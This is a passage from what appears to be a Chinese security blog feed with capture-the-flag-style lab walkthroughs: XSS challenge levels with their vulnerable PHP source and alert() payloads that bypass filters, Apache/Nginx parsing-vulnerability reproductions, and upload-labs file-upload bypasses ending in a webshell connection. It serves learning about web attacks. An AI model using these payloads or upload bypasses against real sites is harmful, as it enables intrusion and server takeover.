class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>替换&lt;script和on,<code>.htmlspecialchars($str)</code>过滤<br>ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。</p></li><li><p>payload<br>根据返回的源代码看到存在注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191655804.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(/xss/)&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>替换一些符号和script</p></li><li><p>payload<br>空格被替换为<code>nbsp;</code><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191713039.png"><br>使用%0a绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a%0ahref=<span class="string">&quot;javascr%0aipt:alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191729841.png"></p></li></ul><h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onmouseover=<span class="title function_">alert</span>(<span class="regexp">/XSS/</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191732101.png"></p></li></ul><h1 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与上关一样</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onmouseover=<span class="title function_">alert</span>(<span class="regexp">/XSS/</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191735561.png"></p></li></ul><h1 id="less-19-20"><a href="#less-19-20" class="headerlink" title="less-19-20"></a>less-19-20</h1><p>涉及反编译,暂时不会</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;less-01&quot;&gt;&lt;a href=&quot;#less-01&quot; class=&quot;headerlink&quot; title=&quot;less-01&quot;&gt;&lt;/a&gt;less-01&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;ini_set&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;display_errors&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;h2 align=center&amp;gt;欢迎用户&amp;quot;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;/h2&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;反射型xss,无过滤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;payload&lt;br&gt;对于XSS漏洞，在实战中未避免因关键字被发现，多采用h5标签进行试探。&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205191420542.png&quot;&gt;&lt;br&gt;注入XSS&lt;/p&gt;
  &lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;name=&lt;span class=&quot;language-xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;title function_&quot;&gt;alert&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;xss&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;  &lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205191428059.png&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;less-02&quot;&gt;&lt;a href=&quot;#less-02&quot; class=&quot;headerlink&quot; title=&quot;less-02&quot;&gt;&lt;/a&gt;less-02&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;ini_set&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;display_errors&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;quot;keyword&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;h2 align=center&amp;gt;没有找到和&amp;quot;&lt;/span&gt;.&lt;span class=&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&amp;quot;相关的结果.&amp;lt;/h2&amp;gt;&amp;quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;lt;center&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;form action=level2.php method=GET&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;input name=keyword  value=&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;input type=submit name=submit value=&amp;quot;搜索&amp;quot;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;/center&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;反射型XSS,&lt;code&gt;htmlspecialchars($str)&lt;/code&gt;过滤,把预定义的字符 “&amp;lt;” （小于）和 “&amp;gt;” （大于）转换为 HTML 实体&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;payload&lt;br&gt;此处需要将突破点转向value，首先应该闭合标签（“&amp;gt;），在进行xss注入。&lt;/p&gt;
  &lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;keyword=&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  &lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205191444081.png&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;less-03&quot;&gt;&lt;a href=&quot;#less-03&quot; class=&quot;headerlink&quot; title=&quot;less-03&quot;&gt;&lt;/a&gt;less-03&lt;/h1&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>vulhub靶场</title>
    <link href="http://example.com/2022/05/15/vulhub%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2022/05/15/vulhub%E9%9D%B6%E5%9C%BA/</id>
    <published>2022-05-15T07:41:23.000Z</published>
    <updated>2022-05-15T08:51:19.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="Apache-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache 换行解析漏洞（CVE-2017-15715）"></a>Apache 换行解析漏洞（CVE-2017-15715）</h2><p>上传抓包</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151546551.png"></p><p>在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是<code>一个\x0A</code>），不再拦截：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151628536.png"></p><p>访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151629134.png"></p><h2 id="Apache-多后缀解析漏洞"><a href="#Apache-多后缀解析漏洞" class="headerlink" title="Apache 多后缀解析漏洞"></a>Apache 多后缀解析漏洞</h2><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html <span class="string">.html</span></span><br><span class="line">AddLanguage zh-CN <span class="string">.cn</span></span><br></pre></td></tr></table></figure><p>其给<code>.html</code>后缀增加了<code>media-type</code>，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler <span class="built_in">application</span>/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><p>上传<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151638905.png"></p><p>访问<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151638268.png"></p><p>图片被解析为PHP</p><h2 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h2><p>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p><p>上传图片马,然后添加后缀访问<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151650893.png"></p><p>图片被解析成PHP</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;解析漏洞&quot;&gt;&lt;a href=&quot;#解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;解析漏洞&quot;&gt;&lt;/a&gt;解析漏洞&lt;/h1&gt;&lt;h2 id=&quot;Apache-换行解析漏洞（CVE-2017-15715）&quot;&gt;&lt;a href=&quot;#Apache-换行解析漏洞（CVE-2017-15715）&quot; class=&quot;headerlink&quot; title=&quot;Apache 换行解析漏洞（CVE-2017-15715）&quot;&gt;&lt;/a&gt;Apache 换行解析漏洞（CVE-2017-15715）&lt;/h2&gt;&lt;p&gt;上传抓包&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205151546551.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;在1.php后面插入一个&lt;code&gt;\x0A&lt;/code&gt;（注意，不能是&lt;code&gt;\x0D\x0A&lt;/code&gt;，只能是&lt;code&gt;一个\x0A&lt;/code&gt;），不再拦截：&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs靶场通关</title>
    <link href="http://example.com/2022/05/11/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
    <id>http://example.com/2022/05/11/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</id>
    <published>2022-05-11T13:09:15.000Z</published>
    <updated>2022-05-15T06:40:56.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>  白名单,仅允许上传<code>.jpg|.png|.gif</code>,但是只有前端校验<br>  上传jpg抓包修改为php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151356926.png?token=ARYCSATVNRPU6DWWWKPPKE3CQCLEW"></p></li><li><p>连接webshell<br>  复制图片地址,使用蚁剑连接<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151356854.png?token=ARYCSAREF6OTJWLDGZ2MYFTCQCLFY"></p></li></ul><h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会对MIME进行验证,与pass-01一样,上传png抓包修改为php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151357477.png?token=ARYCSARZN7HFRNWW54WT6GLCQCLHU"></p><h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        